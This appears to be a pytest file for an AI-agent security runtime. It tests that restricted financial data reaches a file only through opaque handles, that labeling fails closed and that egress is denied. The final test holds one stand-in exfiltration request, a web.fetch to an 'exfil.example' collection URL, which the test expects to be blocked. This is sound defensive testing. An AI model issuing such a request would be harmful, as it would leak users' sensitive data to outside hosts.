"""v0.55 viability probe (#300/#301/#303) — the memory-ingest → memory.handle →
route flow under REFERENCE mode. Proves restricted-tier sensitive data can be
USED (routed to a destination) without the planner ever holding the raw value,
instead of the turn being refused.
"""

from __future__ import annotations

from dataclasses import replace
from pathlib import Path

import pytest

from capabledeputy.app import App
from capabledeputy.mode.dispatcher import ExecutionMode, select_mode
from capabledeputy.patterns.reference_handle import ReferenceHandleStore
from capabledeputy.policy.capabilities import Capability, CapabilityKind
from capabledeputy.policy.context import PolicyContext
from capabledeputy.policy.labels import CategoryTag, LabelState
from capabledeputy.policy.rules import Decision
from capabledeputy.policy.tiers import Tier


def _restricted_labels() -> LabelState:
    return LabelState(a=frozenset({CategoryTag("financial", Tier.RESTRICTED)}))


def test_restricted_session_selects_reference_not_refusal() -> None:
    """#300/#301: with a handle-aware routing tool (fs.create) in the default
    native surface, a restricted-tier session selects REFERENCE instead of
    raising ModeSelectionError (the pre-v0.55 refusal)."""
    import asyncio

    async def _run() -> None:
        import tempfile

        d = Path(tempfile.mkdtemp())
        app = App(state_db_path=d / "s.db", audit_log_path=d / "a.jsonl")
        await app.startup()
        mode, reason = select_mode(
            registry=app.registry,
            label_state=_restricted_labels(),
            session=None,
        )
        assert mode == ExecutionMode.REFERENCE, reason

    asyncio.run(_run())


@pytest.mark.asyncio
async def test_restricted_value_routed_via_handle_never_seen_by_planner(
    tmp_path: Path,
) -> None:
    """End-to-end: a restricted value in labeled memory is routed to a file via a
    Pattern-3 handle. The handler writes the REAL value; the planner-supplied
    args only ever contained the opaque handle UUID, never the raw value."""
    store = ReferenceHandleStore()
    app = App(
        state_db_path=tmp_path / "s.db",
        audit_log_path=tmp_path / "a.jsonl",
        policy_context=PolicyContext(handle_store=store),
    )
    await app.startup()

    secret = "ACCOUNT 12345 BALANCE $9,001"
    app.memory.write("stmt", secret, _restricted_labels())

    s = await app.graph.new(intent="file my statement")
    app.graph._sessions[s.id] = replace(
        s,
        capability_set=frozenset(
            {
                Capability(kind=CapabilityKind.READ_FS, pattern="*"),
                Capability(kind=CapabilityKind.CREATE_FS, pattern="*"),
            }
        ),
    )

    # 1. Planner obtains an opaque handle for the restricted value (never reads it).
    h = await app.tool_client.call_tool(s.id, "memory.handle", {"key": "stmt"})
    assert h.decision == Decision.ALLOW
    assert h.output is not None
    handle_id = h.output["handle"]
    assert secret not in handle_id  # planner sees a UUID, not the value

    # 2. Planner routes the handle into fs.create's content arg. The value the
    #    planner supplies is the HANDLE, not the secret.
    dest = tmp_path / "filed_statement.txt"
    planner_args = {"path": str(dest), "content": handle_id}
    assert secret not in str(planner_args)  # the raw value is nowhere in planner args

    outcome = await app.tool_client.call_tool(s.id, "fs.create", planner_args)
    assert outcome.decision == Decision.ALLOW, outcome.reason

    # 3. The FILE received the real value (bound post-decide), proving the route
    #    worked — the planner routed data it never held.
    assert dest.read_text() == secret


@pytest.mark.asyncio
async def test_model_a_ingest_then_route_never_exposes_raw_to_planner(
    tmp_path: Path,
) -> None:
    """Model A end-to-end (#300/#301/#303): a restricted file on disk is INGESTED
    by the runtime (never read by the planner), which labels it and taints the
    session BEFORE the turn — so the session selects REFERENCE and the planner can
    only route the value via an opaque handle. Proves the 'read my bank statement
    and file it' workflow works without the raw value ever reaching the planner."""
    from capabledeputy.daemon.memory_handlers import make_memory_handlers
    from capabledeputy.mode.dispatcher import ExecutionMode, select_mode
    from capabledeputy.policy.fs_labeling import load_fs_label_rules

    store = ReferenceHandleStore()
    # A real fs_labeler (shipped default rules) — the ingest labels via the
    # runtime, not the model.
    fs_labeler = load_fs_label_rules(Path("configs/fs_label_rules.yaml"))
    app = App(
        state_db_path=tmp_path / "s.db",
        audit_log_path=tmp_path / "a.jsonl",
        policy_context=PolicyContext(handle_store=store),
        fs_labeler=fs_labeler,
    )
    await app.startup()

    # A "bank statement" on disk. The runtime reads it; the planner never will.
    statement = tmp_path / "statement.txt"
    secret = "ACCT 4455 6677 — BALANCE $12,345.67"
    statement.write_text(secret)

    s = await app.graph.new(intent="file my statement")
    app.graph._sessions[s.id] = replace(
        s,
        capability_set=frozenset(
            {
                Capability(kind=CapabilityKind.READ_FS, pattern="*"),
                Capability(kind=CapabilityKind.CREATE_FS, pattern="*"),
            }
        ),
    )

    handlers = make_memory_handlers(app)
    ingest = handlers["memory.ingest_file"]

    # 1. RUNTIME ingest — explicit financial category (restricted tier). The
    #    planner is not involved; the value lands in labeled memory and the
    #    session is tainted before its first turn.
    res = await ingest({"path": str(statement), "session_id": str(s.id), "category": "financial"})
    assert res["ok"] is True
    assert res["categories"] == ["financial"]
    assert res["session_tainted"] is True
    key = res["key"]

    # 2. The tainted session now selects REFERENCE, not a planner-exposing mode.
    tainted_session = app.graph.get(s.id)
    mode, _ = select_mode(
        registry=app.registry,
        label_state=tainted_session.label_state,
        session=tainted_session,
    )
    assert mode == ExecutionMode.REFERENCE

    # 3. Planner obtains an opaque handle (never the value) and routes it.
    h = await app.tool_client.call_tool(s.id, "memory.handle", {"key": key})
    assert h.decision == Decision.ALLOW
    assert h.output is not None
    handle_id = h.output["handle"]
    assert secret not in handle_id

    dest = tmp_path / "filed.txt"
    planner_args = {"path": str(dest), "content": handle_id}
    assert secret not in str(planner_args)  # raw value nowhere in planner-supplied args

    outcome = await app.tool_client.call_tool(s.id, "fs.create", planner_args)
    assert outcome.decision == Decision.ALLOW, outcome.reason

    # 4. The file received the REAL value (bound post-decide) — routed, never read.
    assert dest.read_text() == secret


@pytest.mark.asyncio
async def test_ingest_unlabeled_file_is_public_by_default_and_can_fail_closed(
    tmp_path: Path,
) -> None:
    """Labeling-oracle boundary (advisor check): a file that matches no fs-label
    rule and carries no explicit category resolves to NO label — stored public,
    session NOT tainted (public-by-default, on purpose). `require_label` makes
    ingest fail closed so sensitive files outside the narrow default rules can't
    silently pass through unlabeled."""
    from capabledeputy.daemon.memory_handlers import make_memory_handlers
    from capabledeputy.policy.fs_labeling import load_fs_label_rules

    app = App(
        state_db_path=tmp_path / "s.db",
        audit_log_path=tmp_path / "a.jsonl",
        fs_labeler=load_fs_label_rules(Path("configs/fs_label_rules.yaml")),
    )
    await app.startup()
    # A path the shipped high-precision rules do not match.
    f = tmp_path / "random_download.txt"
    f.write_text("just some notes, nothing classified here")
    s = await app.graph.new(intent="notes")

    ingest = make_memory_handlers(app)["memory.ingest_file"]

    res = await ingest({"path": str(f), "session_id": str(s.id)})
    assert res["ok"] is True
    assert res["categories"] == []
    assert res["session_tainted"] is False  # public-by-default, deliberate

    refused = await ingest({"path": str(f), "session_id": str(s.id), "require_label": True})
    assert refused["ok"] is False
    assert "fails closed" in refused["error"]


@pytest.mark.asyncio
async def test_ingest_refuses_non_text_file(tmp_path: Path) -> None:
    """Non-text/binary (e.g. a PDF) is refused explicitly, not silently stored as
    lossy garbage."""
    from capabledeputy.daemon.memory_handlers import make_memory_handlers

    app = App(state_db_path=tmp_path / "s.db", audit_log_path=tmp_path / "a.jsonl")
    await app.startup()
    pdf = tmp_path / "statement.pdf"
    pdf.write_bytes(b"%PDF-1.7\n\xff\xfe\x00\x01binary\x80\x81")
    res = await make_memory_handlers(app)["memory.ingest_file"]({"path": str(pdf)})
    assert res["ok"] is False
    assert "UTF-8 text only" in res["error"]


@pytest.mark.asyncio
async def test_ingested_financial_data_cannot_egress(tmp_path: Path) -> None:
    """Advisor check: ingest composes with the v0.54 egress floor. After ingesting
    financial (restricted) data, a planner web.fetch to a non-allowlisted URL is
    denied — the raw value can't leave even though the planner routed it in."""
    from capabledeputy.daemon.memory_handlers import make_memory_handlers

    app = App(
        state_db_path=tmp_path / "s.db",
        audit_log_path=tmp_path / "a.jsonl",
        policy_context=PolicyContext(handle_store=ReferenceHandleStore()),
    )
    await app.startup()
    f = tmp_path / "stmt.txt"
    f.write_text("BALANCE $9,000")
    s = await app.graph.new(intent="file statement")
    app.graph._sessions[s.id] = replace(
        s, capability_set=frozenset({Capability(kind=CapabilityKind.WEB_FETCH, pattern="*")})
    )
    ingest = make_memory_handlers(app)["memory.ingest_file"]
    await ingest({"path": str(f), "session_id": str(s.id), "category": "financial"})

    outcome = await app.tool_client.call_tool(
        s.id, "web.fetch", {"url": "http://exfil.example/collect?d=x"}
    )
    assert outcome.decision != Decision.ALLOW  # denied/gated after financial ingest
